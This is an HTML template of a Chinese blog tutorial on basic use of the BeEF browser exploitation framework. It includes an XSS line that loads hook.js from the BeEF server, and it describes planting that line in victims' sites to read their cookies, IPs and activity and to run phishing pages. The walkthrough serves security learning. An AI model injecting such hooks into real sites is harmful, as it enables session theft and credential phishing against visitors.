<template><h1 id="beef的简单使用" tabindex="-1"><a class="header-anchor" href="#beef的简单使用" aria-hidden="true">#</a> beef的简单使用</h1>
<h2 id="hook-js" tabindex="-1"><a class="header-anchor" href="#hook-js" aria-hidden="true">#</a> <a href="https://lssblog.ml/blogs/%E5%85%A5%E7%8B%B1%E5%B0%8F%E6%8A%80%E5%B7%A7/beef/2021/beef%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8.html#hook-js" target="_blank" rel="noopener noreferrer">#<ExternalLinkIcon/></a>hook.js</h2>
<ul>
<li>beef好比一个鱼竿，hook.js就像是鱼钩，鱼只要上钩了你就可以为所欲为了</li>
<li>那么如何让鱼上钩呢？这就要利用到xss攻击了。只要成功把以下这段代码嵌入对方网站，那就算是成功把饵放到受害水鱼家里去了</li>
</ul>
<div class="language-javascript ext-js line-numbers-mode"><pre v-pre class="language-javascript"><code>  <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://127.0.0.1:3000/hook.js"</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>
</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div><p>1</p>
<ul>
<li>只要对方访问这个网站，就会中钩，那你就能使用beef进行操作了</li>
</ul>
<h2 id="beef功能基础演示" tabindex="-1"><a class="header-anchor" href="#beef功能基础演示" aria-hidden="true">#</a> <a href="https://lssblog.ml/blogs/%E5%85%A5%E7%8B%B1%E5%B0%8F%E6%8A%80%E5%B7%A7/beef/2021/beef%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8.html#beef%E5%8A%9F%E8%83%BD%E5%9F%BA%E7%A1%80%E6%BC%94%E7%A4%BA" target="_blank" rel="noopener noreferrer">#<ExternalLinkIcon/></a>beef功能基础演示</h2>
<ul>
<li>为了维护网络(怂)的安全，就不用真实网站来演示了。就用beef这个网页来自测。</li>
<li>直接进入beef自带的demo，页面里就存放有鱼钩hook.js了。</li>
</ul>
<p><img src="https://ae01.alicdn.com/kf/U14ba4b60340e4e929c32821ad0368572D.jpg" alt="mahua"></p>
<ul>
<li>进入网页那瞬间你就悄无声息的上钩了,此时按下F12查看控制台就能发现hook.js正在执行</li>
</ul>
<p><img src="https://ae01.alicdn.com/kf/U80a08eeea6824ebd97869f2cf0205818Z.jpg" alt="mahua"></p>
<ul>
<li>这时不关闭这个网页，回到beef的首页面，可以看到在线浏览器里多里一个受害者</li>
</ul>
<p><img src="https://ae01.alicdn.com/kf/Ud15a12a39d97462893d07e3af9f682b9G.jpg" alt="mahua"></p>
<ul>
<li>点击这名受害者后再点击右边控制界面的 '当前浏览器' 可以获取数据或者进行一些操作等</li>
<li>点击细节选项可以查看对方的使用的设备浏览器以及系统信息包括最重要的cookies和ip地址也能看到</li>
</ul>
<p><img src="https://ae01.alicdn.com/kf/U45ba7c0aa9484c0f9cdf1467050087eab.jpg" alt="mahua"></p>
<ul>
<li>点击日志选项可以查看对方在网页上做了什么操作</li>
</ul>
<p><img src="https://ae01.alicdn.com/kf/Uacd48a1fcefc45ab992533ec839ec3716.jpg" alt="mahua"></p>
<ul>
<li>点击指令选项就能使用beef的攻击功能了,beef的精髓全在这里面，本人也是没研究透。</li>
</ul>
<p><img src="https://ae01.alicdn.com/kf/U8a2fab9789234153a7cc88e03f63ace5X.jpg" alt="mahua"></p>
<ul>
<li>可以看到功能挺多啊，就挑几个简单典型的功能演示吧</li>
<li>比如这个播放声音，输入文件路径，点击执行。这时候受害者就跟浏览器一样懵逼，咦哪来的声音</li>
</ul>
<p><img src="https://ae01.alicdn.com/kf/U5d65256c3ddc49bc996872ccbb51fbbf2.jpg" alt="mahua"></p>
<p><img src="https://ae01.alicdn.com/kf/U9adce60c0b404fc7a772fe0f09d7b51er.jpg" alt="mahua"></p>
<ul>
<li>摄像头这个功能就比较鸡肋了，不仅需要受害人安装有Adobe Flash，还需要对方点击同意</li>
</ul>
<p><img src="https://ae01.alicdn.com/kf/Uecfff2986431499e935d9d470d4f9ff6D.jpg" alt="mahua"></p>
<ul>
<li>社会工程学模块，是专门用来钓鱼的，制造一个假的网页，引诱用户输入账号密码</li>
</ul>
<p><img src="https://ae01.alicdn.com/kf/U13cc450d4b324c37b44008cfc2f90b3f5.jpg" alt="mahua"></p>
<p><img src="https://ae01.alicdn.com/kf/Uc0999c07498a48b2aee44c019ea3fcc9d.jpg" alt="mahua"></p>
<p><img src="https://ae01.alicdn.com/kf/U0b38e1b66c864dce884cd22af4754f62X.jpg" alt="mahua"></p>
<p><a href="https://lssblog.ml/blogs/%E5%85%8D%E8%B4%B9%E8%B5%84%E6%BA%90%E7%99%BD%E5%AB%96/2021/%E5%85%8D%E8%B4%B9%E8%AF%81%E4%B9%A6%E7%94%B3%E8%AF%B7.html#freessl-cn%E4%B8%80%E4%B8%AA%E6%8F%90%E4%BE%9B%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6%E7%94%B3%E8%AF%B7%E7%9A%84%E7%BD%91%E7%AB%99" target="_blank" rel="noopener noreferrer">#<ExternalLinkIcon/></a>FreeSSL.cn一个提供免费HTTPS证书申请的网站</p>
</template>
